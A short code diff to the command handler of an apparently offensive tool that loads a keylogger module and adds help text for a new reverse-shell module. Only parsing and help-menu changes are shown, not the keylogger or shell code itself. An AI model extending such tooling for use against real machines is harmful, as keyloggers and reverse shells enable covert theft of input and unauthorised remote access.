@@ -18,7 +18,7 @@ class Handler:
 
     # bad code :)
     def handle_command(self, command):
-        if command[0:3] == "USE" or command[0:3] == "use":
+        if command[:3] == "USE" or command[0:3] == "use":
             module = command[4:]
             if module == "logger":
                 self.module = logger.Keylogger(self.args)
@@ -40,7 +40,7 @@ class Handler:
             if command == "start" or command == "run":
                 self.module.start()
 
-        if command == "options":
+        if command[:7] == "options":
             if self.module == "":
                 print("No module selected")
                 return
@@ -65,6 +65,9 @@ class Handler:
             start   - Starts the keylogger module
             options - view and edit the current options
                 options set <option> <value>
+        shell       - creates a reverse shell
+            start   - Starts the module
+            options - view and edit the current options
         """
 
         print(help_payload)
